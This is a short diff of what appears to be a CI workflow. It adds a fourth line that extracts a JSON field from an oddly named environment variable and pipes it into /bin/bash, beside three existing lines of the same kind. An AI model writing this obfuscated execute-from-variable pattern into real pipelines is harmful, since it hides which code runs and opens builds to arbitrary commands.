@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$lp1250" | jq -r .td1322 | /bin/bash
           printf '%s' "$h9" | jq -r .b0 | /bin/bash
           echo $qgi069 | jq -r .bjbrc043 | /bin/bash
+          echo $x12072 | jq -r .i016 | /bin/bash
 
       - name: Save archive
         if: always()
